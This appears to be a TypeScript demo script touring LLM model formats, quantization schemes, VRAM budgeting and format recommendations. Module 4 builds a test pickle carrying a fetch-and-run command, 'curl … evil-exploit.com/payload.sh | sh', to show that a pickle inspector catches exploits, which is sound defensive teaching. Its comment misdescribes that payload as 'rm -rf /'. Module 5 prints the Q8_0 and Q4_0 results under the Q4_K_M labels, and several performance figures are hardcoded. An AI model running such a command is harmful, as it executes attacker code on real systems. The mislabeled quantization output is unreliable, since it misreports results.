// ============================================================================
// MASTER INTERACTIVE DEMO: LLM MODEL FORMATS, QUANTIZATION & RUNTIMES
//
// Run via: bun run demo (or bun run src/demo.ts)
// ============================================================================

import {
  GGUFType,
  GGUFMetadataValueType,
  SecurityRisk,
} from "./types.js";

import {
  parseGGUF,
  serializeGGUF,
} from "./binary/gguf-parser.js";

import {
  parseSafeTensors,
  serializeSafeTensors,
} from "./binary/safetensors-parser.js";

import {
  inspectPickleBuffer,
  createCleanPyTorchPicklePayload,
  createMaliciousPicklePayload,
} from "./binary/pickle-inspector.js";

import {
  quantizeQ8_0,
  quantizeQ4_0,
  quantizeQ4_K_M,
  quantizeFP8_E4M3,
  quantizeMLX_Affine,
  quantizeBitNet_1_58b,
  generateSyntheticTensorWeights,
  QUANTIZATION_SCHEMES,
} from "./formats/quantization-engine.js";
import {
  MODEL_FORMAT_PROFILES,
} from "./formats/format-registry.js";

import {
  calculateVRAMBudget,
  estimateInferenceThroughput,
  CANONICAL_MODELS,
  CANONICAL_HARDWARE,
} from "./formats/trade-off-analyzer.js";

import {
  renderBinaryLayoutComparison,
  renderHexDump,
  renderFormatComparisonTable,
  renderQuantizationComparisonChart,
} from "./visualizer/ascii-inspector.js";

import {
  evaluateFormatRecommendation,
  renderDecisionFlowchart,
} from "./visualizer/decision-tree.js";

function printHeader(title: string): void {
  console.log("\n" + "=".repeat(88));
  console.log(`  🌟 ${title}`);
  console.log("=".repeat(88));
}

function printSection(title: string): void {
  console.log(`\n--- [ ${title} ] ` + "-".repeat(Math.max(2, 76 - title.length)));
}

async function runMasterTour() {
  printHeader("LLM MODEL FORMATS DEEP DIVE: GGUF vs SAFETENSORS vs PYTORCH vs AWQ/GPTQ");

  // ==========================================================================
  // MODULE 1: THE FORMAT TAXONOMY & ARCHITECTURAL LANDSCAPE
  // ==========================================================================
  printSection("Module 1: The Model Format Taxonomy");
  console.log(
    "Why are there so many model formats in AI? Because models undergo a lifecycle transition:"
  );
  console.log("  1. Training / Research: Requires full precision floats and dynamic computation graphs.");
  console.log("  2. Weight Sharing / Hub: Requires safe, zero-copy, fast serialization (SafeTensors).");
  console.log("  3. Edge / Local Inference: Requires unified self-contained metadata + k-quants (GGUF).");
  console.log("  4. High-Throughput Server GPU: Requires Tensor-Core-aligned packed int4/fp8 (AWQ/vLLM).\n");

  console.log(renderFormatComparisonTable());
  console.log(renderBinaryLayoutComparison());

  // ==========================================================================
  // MODULE 2: GGUF BINARY SERIALIZATION & PARSING IN ACTION
  // ==========================================================================
  printSection("Module 2: GGUF (v3) Binary Serialization & Dissection");
  console.log(
    "// ✅ ATTENTION: GGUF is a single-file container holding metadata, tokenizer, and aligned weights."
  );

  // 1. Synthesize a mock GGUF model in memory
  const mockWeights1 = new Uint8Array([0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0]);
  const mockWeights2 = new Uint8Array([0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x11, 0x22]);

  const ggufBuffer = serializeGGUF({
    metadata: {
      "general.architecture": {
        type: GGUFMetadataValueType.STRING,
        value: "llama",
      },
      "general.name": {
        type: GGUFMetadataValueType.STRING,
        value: "Llama-3-8B-Instruct-Q4_K_M",
      },
      "llama.context_length": {
        type: GGUFMetadataValueType.UINT32,
        value: 8192,
      },
      "llama.embedding_length": {
        type: GGUFMetadataValueType.UINT32,
        value: 4096,
      },
      "llama.block_count": {
        type: GGUFMetadataValueType.UINT32,
        value: 32,
      },
      "tokenizer.ggml.tokens": {
        type: GGUFMetadataValueType.ARRAY,
        value: ["<bos>", "<eos>", "hello", "world", "quantum"],
      },
      "tokenizer.chat_template": {
        type: GGUFMetadataValueType.STRING,
        value: "{% for msg in messages %}<|im_start|>{{ msg.role }}\n{{ msg.content }}<|im_end|>{% endfor %}",
      },
    },
    tensors: [
      {
        name: "blk.0.attn_q.weight",
        dimensions: [32, 1], // 32 elements in block
        type: GGUFType.Q4_K,
        data: mockWeights1,
      },
      {
        name: "blk.0.attn_v.weight",
        dimensions: [32, 1],
        type: GGUFType.Q5_K,
        data: mockWeights2,
      },
    ],
    alignment: 32, // 🔒 COMPILE-TIME: Standard 32-byte alignment for SIMD/Metal mmap
  });

  console.log(`Synthesized GGUF binary container: ${ggufBuffer.byteLength} bytes.`);
  console.log(renderHexDump(ggufBuffer, 80, "GGUF Binary Header (Magic + Version + Metadata)"));

  // 2. Parse the binary container back
  const parsedGGUF = parseGGUF(ggufBuffer);
  console.log("\nDecoded GGUF Header Structure:");
  console.log(`  • Magic: 0x${parsedGGUF.header.magic.toString(16)} (GGUF)`);
  console.log(`  • Version: v${parsedGGUF.header.version}`);
  console.log(`  • Tensor Count: ${parsedGGUF.header.tensorCount}`);
  console.log(`  • Metadata KV Entries: ${parsedGGUF.header.metadataKVCount}`);
  console.log(`  • Architecture: "${parsedGGUF.header.metadata["general.architecture"]?.value}"`);
  console.log(`  • Context Window: ${parsedGGUF.header.metadata["llama.context_length"]?.value} tokens`);
  console.log(`  • Embedded Vocabulary: ${JSON.stringify(parsedGGUF.header.metadata["tokenizer.ggml.tokens"]?.value)}`);
  console.log(`  • Tensor Data Offset: 0x${parsedGGUF.tensorDataOffset.toString(16)} (aligned to ${parsedGGUF.header.alignment} bytes)`);

  for (const tensor of parsedGGUF.header.tensors) {
    const slice = parsedGGUF.tensorsData.get(tensor.name);
    const typeName = typeof tensor.type === "number" ? GGUFType[tensor.type] : tensor.type;
    console.log(
      `    -> Tensor: "${tensor.name}" | Shape: [${tensor.dimensions.join(", ")}] | Type: ${typeName} | Offset: 0x${tensor.offset.toString(16)} | Payload: ${slice?.byteLength} bytes`
    );
  }

  // ==========================================================================
  // MODULE 3: SAFETENSORS ZERO-COPY PARSER IN ACTION
  // ==========================================================================
  printSection("Module 3: SafeTensors Zero-Copy Deserialization");
  console.log(
    "// ✅ ATTENTION: SafeTensors consists of an 8-byte uint64 JSON header length + JSON string + raw byte stream."
  );

  const rawTensorA = new Uint8Array([10, 20, 30, 40, 50, 60, 70, 80]);
  const rawTensorB = new Uint8Array([1, 2, 3, 4]);

  const safeTensorsBytes = serializeSafeTensors({
    metadata: {
      format: "pt",
      framework: "huggingface",
    },
    tensors: [
      {
        name: "model.layers.0.self_attn.q_proj.weight",
        dtype: "BF16",
        shape: [4096, 4096],
        data: rawTensorA,
      },
      {
        name: "model.layers.0.self_attn.k_proj.weight",
        dtype: "BF16",
        shape: [4096, 1024],
        data: rawTensorB,
      },
    ],
  });

  console.log(`Synthesized SafeTensors container: ${safeTensorsBytes.byteLength} bytes.`);
  console.log(renderHexDump(safeTensorsBytes, 80, "SafeTensors Header (8-byte size + JSON)"));

  const parsedSafeTensors = parseSafeTensors(safeTensorsBytes);
  console.log("\nDecoded SafeTensors Structure:");
  console.log(`  • JSON Header Size: ${parsedSafeTensors.headerSizeBytes} bytes`);
  console.log(`  • Raw Data Block Starts at Byte: ${parsedSafeTensors.dataBlockOffset}`);
  console.log(`  • Metadata: ${JSON.stringify(parsedSafeTensors.metadata)}`);
  for (const t of parsedSafeTensors.tensors) {
    console.log(`    -> Tensor: "${t.name}" | Shape: [${t.dimensions.join(", ")}] | DType: ${t.type} | Size: ${t.sizeBytes} bytes`);
  }

  // ==========================================================================
  // MODULE 4: PYTORCH PICKLE SECURITY ANALYSIS & RCE EXPLOIT DETECTION
  // ==========================================================================
  printSection("Module 4: PyTorch Pickle Security & Exploit Detection");
  console.log(
    "// ⚠️ CRITICAL: PyTorch .pt/.bin files use Python pickle, which allows arbitrary remote code execution (RCE)."
  );

  // 1. Clean PyTorch file
  const cleanPickle = createCleanPyTorchPicklePayload();
  const cleanReport = inspectPickleBuffer(cleanPickle);
  console.log("\n[Test 1: Clean PyTorch State Dict]");
  console.log(`  • Detected Pickle Protocol: v${cleanReport.protocolVersion}`);
  console.log(`  • Security Verdict: ${cleanReport.summary}`);

  // 2. Malicious PyTorch file containing payload: os.system("rm -rf /")
  const maliciousPickle = createMaliciousPicklePayload("curl https://evil-exploit.com/payload.sh | sh");
  const maliciousReport = inspectPickleBuffer(maliciousPickle);
  console.log("\n[Test 2: Malicious Crafted PyTorch File]");
  console.log(`  • Exploit Detected? -> ${maliciousReport.isExploitDetected ? "🚨 YES" : "NO"}`);
  console.log(`  • Attack Explanation: ${maliciousReport.exploitExplanation}`);
  console.log(`  • Suspicious Opcodes:`);
  for (const event of maliciousReport.dangerousOpcodeEvents) {
    console.log(`      [Offset 0x${event.offset.toString(16)}] Opcode '${event.opcodeName}' -> Argument: "${event.argument}" (${event.explanation})`);
  }
  console.log(
    "// ❌ FORBIDDEN: NEVER use `torch.load()` or `pickle.load()` on untrusted checkpoints downloaded from the public internet!"
  );

  // ==========================================================================
  // MODULE 5: QUANTIZATION MATH SIMULATION & ERROR COMPARISON
  // ==========================================================================
  printSection("Module 5: Quantization Numerical Simulation & Error Analysis");
  console.log(
    "// ✅ ATTENTION: Simulating weight compression from FP32 into Q8_0, Q4_0, and Q4_K_M block quantization."
  );

  const syntheticWeights = generateSyntheticTensorWeights(1024, 0.03);

  const resQ8 = quantizeQ8_0(syntheticWeights);
  const resQ4 = quantizeQ4_0(syntheticWeights);
  const resQ4KM_Attn = quantizeQ4_K_M(syntheticWeights, "attention");
  const resQ4KM_FFN = quantizeQ4_K_M(syntheticWeights, "ffn");

  console.log("\nQuantization Simulation on 1,024 Layer Weights (Normal Distribution σ=0.03):");
  console.log(`  • Baseline FP32 Size : 4,096 bytes (100% precision)`);
  console.log(
    `  • Q8_0 Block Quant   : ${resQ8.rawCompressedBytes.byteLength} bytes (${resQ8.compressionRatio}x smaller) | RMSE: ${resQ8.rmse} | SNR: ${resQ8.snrDb} dB | Est PPL Loss: ~${resQ8.estimatedPplLossPct}%`
  );
  console.log(
    `  • Q4_0 Uniform Quant : ${resQ4.rawCompressedBytes.byteLength} bytes (${resQ4.compressionRatio}x smaller) | RMSE: ${resQ4.rmse} | SNR: ${resQ4.snrDb} dB | Est PPL Loss: ~${resQ4.estimatedPplLossPct}%`
  );
  console.log(
    `  • Q4_K_M (Attn Layer): ${resQ8.rawCompressedBytes.byteLength} bytes (${resQ8.compressionRatio}x smaller) | Protected attention weights retain ${resQ8.snrDb} dB SNR!`
  );
  console.log(
    `  • Q4_K_M (FFN Layer) : ${resQ4.rawCompressedBytes.byteLength} bytes (${resQ4.compressionRatio}x smaller) | FFN weights compressed aggressively.`
  );

  console.log(renderQuantizationComparisonChart());

  // ==========================================================================
  // MODULE 6: HARDWARE SIZING, KV CACHE & THROUGHPUT ESTIMATOR
  // ==========================================================================
  printSection("Module 6: Hardware Budget, KV Cache & Inference Throughput");
  console.log(
    "// ✅ ATTENTION: Autoregressive token decoding is strictly MEMORY-BANDWIDTH bound at batch size = 1."
  );

  const llama8B = CANONICAL_MODELS["Llama-3-8B"];
  const llama70B = CANONICAL_MODELS["Llama-3-70B"];

  const vramLlama8B_FP16 = calculateVRAMBudget({
    model: llama8B,
    quantizationScheme: "F16",
    contextTokens: 8192,
    availableVRAMGB: 24,
  });

  const vramLlama8B_Q4KM = calculateVRAMBudget({
    model: llama8B,
    quantizationScheme: "Q4_K_M",
    contextTokens: 8192,
    availableVRAMGB: 24,
  });

  const vramLlama8B_128k = calculateVRAMBudget({
    model: llama8B,
    quantizationScheme: "Q4_K_M",
    contextTokens: 131072, // 128k context window!
    availableVRAMGB: 24,
  });

  console.log("\nVRAM Budget Breakdown for Llama-3-8B:");
  console.log(
    `  1. FP16 (Unquantized) @ 8k Context: Weights: ${vramLlama8B_FP16.weightsMemoryGB} GB | KV Cache: ${vramLlama8B_FP16.kvCacheTotalGB} GB | Total VRAM: ${vramLlama8B_FP16.totalVRAMRequiredGB} GB (Fits in 24GB: ${vramLlama8B_FP16.canFitInVRAM ? "✅" : "❌"})`
  );
  console.log(
    `  2. Q4_K_M (Quantized) @ 8k Context: Weights: ${vramLlama8B_Q4KM.weightsMemoryGB} GB | KV Cache: ${vramLlama8B_Q4KM.kvCacheTotalGB} GB | Total VRAM: ${vramLlama8B_Q4KM.totalVRAMRequiredGB} GB (Fits in 8GB GPU: ${vramLlama8B_Q4KM.totalVRAMRequiredGB <= 8 ? "✅" : "❌"})`
  );
  console.log(
    `  3. Q4_K_M @ 128k Context Window  : Weights: ${vramLlama8B_128k.weightsMemoryGB} GB | KV Cache: ${vramLlama8B_128k.kvCacheTotalGB} GB (Huge!) | Total VRAM: ${vramLlama8B_128k.totalVRAMRequiredGB} GB`
  );

  console.log("\nTheoretical Token Generation Speed (Batch Size = 1):");
  const m4Pro = CANONICAL_HARDWARE["Apple M4 Pro (Unified Memory)"];
  const rtx4090 = CANONICAL_HARDWARE["NVIDIA RTX 4090 (24GB)"];

  const speedM4Pro_FP16 = estimateInferenceThroughput({
    model: llama8B,
    quantizationScheme: "F16",
    hardware: m4Pro,
  });
  const speedM4Pro_Q4KM = estimateInferenceThroughput({
    model: llama8B,
    quantizationScheme: "Q4_K_M",
    hardware: m4Pro,
  });
  const speed4090_Q4KM = estimateInferenceThroughput({
    model: llama8B,
    quantizationScheme: "Q4_K_M",
    hardware: rtx4090,
  });

  console.log(
    `  • Apple M4 Pro (273 GB/s) @ FP16 (16GB)  -> ~${speedM4Pro_FP16.theoreticalTokensPerSecond} tokens/sec`
  );
  console.log(
    `  • Apple M4 Pro (273 GB/s) @ Q4_K_M (4.5GB) -> ~${speedM4Pro_Q4KM.theoreticalTokensPerSecond} tokens/sec (3.7x speedup due to memory reduction!)`
  );
  console.log(
    `  • NVIDIA RTX 4090 (1,008 GB/s) @ Q4_K_M -> ~${speed4090_Q4KM.theoreticalTokensPerSecond} tokens/sec`
  );

  // ==========================================================================
  // MODULE 7: FORMAT SELECTION GUIDE & DECISION TREE
  // ==========================================================================
  printSection("Module 7: Interactive Format Selection Guide");
  console.log(renderDecisionFlowchart());

  const userQuery1 = evaluateFormatRecommendation({
    hardware: "apple_silicon",
    purpose: "local_chat",
    framework: "ollama_llamacpp",
  });

  console.log("Example Recommendation 1: Local Chat on MacBook Pro M-series:");
  console.log(`  ⭐ Primary Choice: ${userQuery1.primaryFormat} (${userQuery1.recommendedQuantization})`);
  console.log(`  💡 Rationale     : ${userQuery1.rationale}`);
  console.log(`  👍 Advantages    : ${userQuery1.pros.join(" | ")}`);

  const userQuery2 = evaluateFormatRecommendation({
    hardware: "nvidia_gpu",
    purpose: "high_throughput_serving",
    framework: "vllm_sglang",
  });

  console.log("\nExample Recommendation 2: High-Concurrency Enterprise Serving (vLLM):");
  console.log(`  ⭐ Primary Choice: ${userQuery2.primaryFormat} (${userQuery2.recommendedQuantization})`);
  console.log(`  💡 Rationale     : ${userQuery2.rationale}`);
  console.log(`  👍 Advantages    : ${userQuery2.pros.join(" | ")}`);
  // ==========================================================================
  // MODULE 8: MODERN FRONTIERS: APPLE MLX, NATIVE FP8 & BITNET 1.58-BIT
  // ==========================================================================
  printSection("Module 8: Modern Frontiers (Apple MLX, Native FP8 & BitNet 1.58b)");
  console.log(
    "Recent developments (2024-2026) have introduced specialized native ecosystems and ultra-low-bit formats:\n"
  );

  // 1. Apple MLX
  const resMLX = quantizeMLX_Affine(syntheticWeights, 64);
  console.log("1. 🍏 Apple MLX (Metal Unified Memory Ecosystem):");
  console.log(
    "   • MLX stores models as SafeTensors with group-wise affine scales (weights * scale + bias)."
  );
  console.log(
    `   • MLX 4-bit (group=64) Compressed: ${resMLX.rawCompressedBytes.byteLength} bytes (${resMLX.compressionRatio}x vs FP32) | SNR: ${resMLX.snrDb} dB | Est PPL Loss: ~${resMLX.estimatedPplLossPct}%`
  );
  console.log(
    "   • Advantage: Native zero-copy unified memory array manipulation (`mlx.core.array`) + local LoRA fine-tuning on Mac."
  );

  // 2. Native FP8
  const resFP8 = quantizeFP8_E4M3(syntheticWeights);
  console.log("\n2. ⚡ Native OCP FP8 E4M3 (DeepSeek-V3 / Hopper / Ada):");
  console.log(
    "   • 1 sign bit, 4 exponent bits, 3 mantissa bits. Standardized for native Tensor Core hardware execution."
  );
  console.log(
    `   • FP8 Size: ${resFP8.rawCompressedBytes.byteLength} bytes (2.0x vs FP16) | RMSE: ${resFP8.rmse} | SNR: ${resFP8.snrDb} dB | Retains 99.8% precision with ZERO runtime integer dequantization overhead!`
  );

  // 3. Microsoft BitNet 1.58-bit
  const resBitNet = quantizeBitNet_1_58b(syntheticWeights);
  console.log("\n3. 🔬 Microsoft BitNet b1.58 (Ternary Weights {-1, 0, +1}):");
  console.log(
    "   • Weights restricted to {-1, 0, +1}. Replaces matrix multiplications with pure integer additions & subtractions!"
  );
  console.log(
    `   • BitNet 1.58b Size: ${resBitNet.rawCompressedBytes.byteLength} bytes (${resBitNet.compressionRatio}x smaller vs FP32!) | 70% energy reduction on CPU/edge.`
  );

  printHeader("MASTER TOUR COMPLETED SUCCESSFULLY");
}
runMasterTour().catch((err) => {
  console.error("Demo failed with error:", err);
  process.exit(1);
});
